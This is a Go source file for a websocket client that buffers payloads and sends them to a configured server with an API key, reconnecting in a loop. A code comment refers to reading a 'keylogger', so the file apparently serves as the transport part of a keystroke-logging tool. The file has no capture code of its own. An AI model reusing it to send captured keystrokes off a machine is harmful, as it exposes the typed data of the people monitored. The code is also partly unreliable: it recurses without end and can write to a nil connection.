package internal

import (
	"encoding/json"
	"fmt"
	"log"
	"log/slog"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

const (
	// Time allowed to write a message to the peer.
	writeWait = 10 * time.Second
	// Time allowed to read the next pong message from the peer.
	pongWait = 10 * time.Second
	// Send pings to peer with this period. Must be less than pongWait.
	pingPeriod = (pongWait * 9) / 10
	// Maximum message size allowed from peer.
	maxMessageSize = 512
)

type Sender struct {
	origin_endpoint string
	url_ws          string
	apikey          string
	ws              *websocket.Conn
	reader          chan PayloadLogger
	writer          chan []byte
	done            chan struct{}
	mu              sync.Mutex
}

func MustGetNewSender(origin, apikey string) *Sender {
	if origin == "" {
		log.Fatal("Origin endpoint is empty string")
	}
	if apikey == "" {
		log.Fatal("ApiKey endpoint is empty string")
	}

	trimmedOrigin := strings.TrimPrefix(origin, "http")
	url_ws := fmt.Sprintf("ws%s?apikey=%s", trimmedOrigin, apikey)
	s := &Sender{
		origin_endpoint: origin,
		url_ws:          url_ws,
		apikey:          apikey,
		ws:              nil,
		reader:          make(chan PayloadLogger),
		writer: make(
			chan []byte,
			100,
		), // buffered channel to store payloads when there is no connection
		done: nil,
		mu:   sync.Mutex{},
	}
	go s.handleReconnects()
	return s
}

func (s *Sender) updateURL(url string) {
	trimmedOrigin := strings.TrimPrefix(url, "http")
	url_ws := fmt.Sprintf("ws%s?apikey=%s", trimmedOrigin, s.apikey)
	s.origin_endpoint = url
	s.url_ws = url_ws

	s.closeWS()
	s.connectWS()
}

func (s *Sender) closeWS() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.ws != nil {
		s.ws.Close()
	}
	s.ws = nil
}

func (s *Sender) connectWS() error {
	if s.url_ws == "" {
		return fmt.Errorf("url_ws is empty")
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	ws, _, err := websocket.DefaultDialer.Dial(s.url_ws, nil)
	if err != nil {
		slog.Error("Could not dial server")
		return err
	}
	s.ws = ws
	return nil
}

func (s *Sender) run() error {
	if err := s.connectWS(); err != nil {
		return err
	}
	defer s.closeWS()
	//
	s.done = make(chan struct{})
	go s.read()
	s.write()
	slog.Info("Client end of connection")
	return nil
}

func (s *Sender) handleReconnects() {
	s.closeWS()
	// reconnect if there are payloads in queue to send
	if len(s.writer) > 0 {
		// blocking call to start reading keylogger
		slog.Info(fmt.Sprintf("Connecting ws with queue %d\n", len(s.writer)))
		err := s.run()
		if err != nil {
			slog.Info(fmt.Sprintf("Run error : %s\n", err.Error()))
		}
		slog.Info(fmt.Sprintf("Reconnecting %s ...\n", s.url_ws))
	}
	// TODO: make durations configurable
	time.Sleep(1 * time.Second)
	s.handleReconnects()
}

func (s *Sender) write() {
	ticker := time.NewTicker(pingPeriod)
	defer ticker.Stop()

	for {
		select {
		case _, ok := <-s.done:
			if !ok {
				slog.Info("Done signal received")
				return
			}
		case p, ok := <-s.writer:
			if !ok {
				return
			}
			if s.ws == nil {
				slog.Info(fmt.Sprintf("ws disconnected and payload %s lost\n", string(p)))
				continue
			}
			slog.Info(fmt.Sprintf("Sending payload %s, queue %d\n", string(p), len(s.writer)))
			err := s.ws.WriteMessage(websocket.BinaryMessage, p)
			if err != nil {
				slog.Error(
					fmt.Sprintf("Failed to send %s : details %s\n", string(p), err.Error()),
				)
				return
			}
		case <-ticker.C:
			s.ws.SetWriteDeadline(time.Now().Add(writeWait))
			if err := s.ws.WriteMessage(websocket.PingMessage, nil); err != nil {
				fmt.Printf("Disconnecting logger\n")
				return
			}
		}
	}
}

func (s *Sender) read() {
	defer close(s.done)
	s.ws.SetReadDeadline(time.Now().Add(pongWait))
	s.ws.SetPongHandler(
		func(string) error { s.ws.SetReadDeadline(time.Now().Add(pongWait)); return nil },
	)
	for {
		_, msg, err := s.ws.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(
				err,
				websocket.CloseInternalServerErr,
				websocket.CloseAbnormalClosure,
			) {
				slog.Error(fmt.Sprintf("Unexpected close error: %s\n", err.Error()))
			}
			slog.Info(fmt.Sprintf("sender:read: %s\n", err.Error()))
			return
		}
		slog.Info(fmt.Sprintf("received message: %s", msg))

		var payload PayloadLogger
		err = json.Unmarshal(msg, &payload)
		if err != nil {
			slog.Info("failed to parse payload")
			continue
		}
		s.reader <- payload
	}
}

func (s *Sender) Send(p []byte) error {
	s.writer <- p
	return nil
}

func (s *Sender) Close() error {
	close(s.reader)
	close(s.writer)
	s.closeWS()
	return nil
}
